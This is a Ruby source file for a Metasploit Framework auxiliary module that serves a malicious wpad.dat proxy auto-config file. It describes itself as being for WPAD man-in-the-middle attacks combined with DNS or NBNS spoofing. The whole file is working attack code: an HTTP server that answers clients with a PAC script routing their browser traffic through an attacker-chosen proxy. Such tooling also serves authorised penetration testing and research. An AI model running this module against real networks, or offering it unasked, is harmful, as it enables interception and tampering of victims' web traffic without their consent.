##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'WPAD.dat file server',
			'Version'     => '$Revision$',
			'Description' => %q{
					This module generates a valid wpad.dat file for WPAD mitm attacks. Usually used in combination with DNS attacks or nbns response spoofing.
			},
			'Author'      =>
				[
					'et'            # Metasploit module
				],
			'Version'     => '$Revision$',
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'WebServer' ]
				],
			'PassiveActions' =>
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options(
			[
				OptPort.new('SRVPORT',[ true, "Server port", 80 ]),
				OptString.new('URIPATH',[ true, "WPAD/PAC Data file name (wpad.dat, proxy.pac)", '/wpad.dat' ]),
				OptAddress.new('EXCLUDENETWORK', [ true, "Network to exclude",'127.0.0.1' ]),
				OptAddress.new('EXCLUDENETMASK', [ true, "Netmask to exclude",'255.255.255.0' ]),
				OptAddress.new('PROXY', [ true, "Proxy to redirect traffic to", '0.0.0.0' ]),
				OptPort.new('PROXYPORT',[ true, "Proxy port", 8080 ])
			], self.class)
	end
	
	def on_client_connect(c)
 		c.extend(Rex::Proto::Http::ServerClient)
 		c.init_cli(self)
 	end
 
	def on_request_uri(cli, request)
		print_status("Request '#{request.method} #{request.headers['user-agent']} from #{cli.peerhost}:#{cli.peerport}")


		return if request.method == "POST"

		html = <<-EOS
function FindProxyForURL(url, host) {
      // URLs within this network are accessed directly 
      if (isInNet(host, "#{datastore['EXCLUDENETWORK']}", "#{datastore['EXCLUDENETMASK']}"))
      {
         return "DIRECT";
      }
      return "PROXY #{datastore['PROXY']}:#{datastore['PROXYPORT']}; DIRECT";
   }
EOS

		print_status("Sending WPAD config ...")
		send_response_html(cli, html,
			{
				'Content-Type' => 'application/x-ns-proxy-autoconfig'
			})
	end

	def run
		exploit()
	end
end

